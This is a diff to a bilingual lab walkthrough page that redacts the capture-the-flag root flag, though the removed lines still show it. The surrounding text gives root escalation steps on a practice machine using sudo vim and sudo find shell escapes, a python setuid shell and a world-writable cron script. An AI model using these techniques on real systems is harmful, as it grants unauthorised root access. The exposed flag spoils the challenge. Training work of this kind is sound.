@@ -83,7 +83,7 @@
     <pre><code class="language-bash">ssh admin@TARGET_IP   # password: password1
 sudo su
 cat /root/root.txt
-# 🚩 HL{r00t_pr1v3sc_succ3ss}
+# 🚩 HL{···}
 
 # Reconocimiento de la máquina:
 sudo cat /etc/sudoers.d/*
@@ -102,7 +102,7 @@ find / -perm -4000 -type f 2>/dev/null
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 id      # uid=0(root)
 cat /root/root.txt
-# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+# 🚩 HL{···}</code></pre>
 
     <h3>📝 bob — sudo vim (GTFOBins)</h3>
     <pre><code class="language-bash">ssh bob@TARGET_IP   # password: welcome1
@@ -115,7 +115,7 @@ sudo -l
 sudo vim -c ':!/bin/bash'
 id      # uid=0(root)
 cat /root/root.txt
-# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+# 🚩 HL{···}</code></pre>
 
     <h3>⏱ charlie — Cron job world-writable</h3>
     <pre><code class="language-bash">ssh charlie@TARGET_IP   # password: changeme
@@ -139,7 +139,7 @@ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/cleanu
 /tmp/rootbash -p
 id      # euid=0(root)
 cat /root/root.txt
-# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+# 🚩 HL{···}</code></pre>
 
     <h3>🔍 dave — sudo find (GTFOBins)</h3>
     <pre><code class="language-bash">ssh dave@TARGET_IP   # password: P@ssw0rd
@@ -152,7 +152,7 @@ sudo -l
 sudo find . -exec /bin/bash \; -quit
 id      # uid=0(root)
 cat /root/root.txt
-# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+# 🚩 HL{···}</code></pre>
 
   </div>
   <div class="lang-content" data-lang="en">
@@ -163,7 +163,7 @@ cat /root/root.txt
     <pre><code class="language-bash">ssh admin@TARGET_IP   # password: password1
 sudo su
 cat /root/root.txt
-# 🚩 HL{r00t_pr1v3sc_succ3ss}
+# 🚩 HL{···}
 
 # Recon commands:
 sudo cat /etc/sudoers.d/*
@@ -180,7 +180,7 @@ find / -perm -4000 -type f 2>/dev/null
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 id      # uid=0(root)
 cat /root/root.txt
-# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+# 🚩 HL{···}</code></pre>
 
     <h3>📝 bob — sudo vim (GTFOBins)</h3>
     <pre><code class="language-bash">ssh bob@TARGET_IP   # password: welcome1
@@ -191,7 +191,7 @@ sudo -l
 sudo vim -c ':!/bin/bash'
 id      # uid=0(root)
 cat /root/root.txt
-# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+# 🚩 HL{···}</code></pre>
 
     <h3>⏱ charlie — World-writable cron script</h3>
     <pre><code class="language-bash">ssh charlie@TARGET_IP   # password: changeme
@@ -209,7 +209,7 @@ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/cleanu
 /tmp/rootbash -p
 id      # euid=0(root)
 cat /root/root.txt
-# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+# 🚩 HL{···}</code></pre>
 
     <h3>🔍 dave — sudo find (GTFOBins)</h3>
     <pre><code class="language-bash">ssh dave@TARGET_IP   # password: P@ssw0rd
@@ -220,7 +220,7 @@ sudo -l
 sudo find . -exec /bin/bash \; -quit
 id      # uid=0(root)
 cat /root/root.txt
-# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+# 🚩 HL{···}</code></pre>
 
   </div>
 </div>
